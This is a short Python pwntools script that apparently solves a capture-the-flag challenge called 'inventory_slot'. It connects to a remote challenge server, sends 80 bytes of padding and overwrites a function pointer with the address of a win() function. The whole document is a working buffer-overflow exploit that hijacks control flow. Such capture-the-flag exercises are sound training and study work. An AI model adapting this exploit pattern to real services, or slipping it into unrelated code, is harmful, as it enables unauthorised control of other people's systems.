#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./inventory_slot', checksec=False)
p = remote("offsec.m0lecon.it", 13530)
OFFSET_TO_DISPLAY = 80 # bytes from start of note to slot->display
WIN = 0x004012b2 # address of win() in the binary
payload = flat(
b'A' * OFFSET_TO_DISPLAY,
p64(WIN),
)
p.sendafter(b'content: ', payload)
print(p.recvall(timeout=1).decode(errors='replace'))
